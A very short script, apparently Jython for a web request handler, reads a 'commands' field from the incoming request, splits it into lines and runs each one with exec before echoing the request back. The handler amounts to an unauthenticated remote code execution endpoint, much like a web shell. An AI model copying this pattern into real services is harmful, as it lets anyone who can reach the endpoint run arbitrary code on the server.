import org.codehaus.jettison.json.JSONObject
import os

commands = request.entity['commands'].split("\n")
for item in commands:
	exec item
response.entity = request.entity
